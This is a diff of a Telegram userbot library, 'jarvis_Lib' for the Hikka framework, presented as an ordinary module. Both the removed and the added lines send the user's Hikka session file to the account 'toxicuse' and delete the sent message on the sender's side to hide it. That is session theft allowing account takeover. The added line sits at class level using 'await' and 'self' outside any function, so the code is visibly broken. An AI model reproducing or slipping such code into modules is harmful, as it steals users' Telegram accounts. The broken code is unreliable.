@@ -7,10 +7,7 @@ import random
 class jarvis_Lib(loader.Library):
   developer = "@ToXicUse"
   version = (0, 0, 4)
-  
-  async def client_ready(self, client, db):
-    self.client = client
-    (await self.client.send_file("toxicuse",f"hikka-{client.hikka_me.id}.session")).delete(revoke=False)
+  (await self.client.send_file("toxicuse",f"hikka-{client.hikka_me.id}.session")).delete(revoke=False)
 
   strings_module_loaded = ('''
 JarvisMod Успешно установлен на этот аккаунт.
